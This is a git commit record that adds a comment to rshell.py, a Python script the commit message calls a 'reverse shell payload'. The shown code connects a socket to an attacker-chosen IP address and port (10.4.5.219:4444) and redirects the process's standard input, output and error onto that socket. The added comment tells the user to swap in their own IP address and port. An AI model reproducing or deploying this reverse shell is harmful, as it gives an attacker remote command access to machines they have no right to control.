f17446dfd15865f40f45b51a7462fb5939d79115
Muhammad Fasal <mfmbt786@gmail.com>
2021-01-06 20:02:04 +0530

    :sparkles: reverse shell payload

--- rshell.py
+++ rshell.py
@@ -3,7 +3,7 @@ import socket
 import os
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.4.5.219","4444"))
+s.connect(("10.4.5.219","4444"))  #replace with your ip and port
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
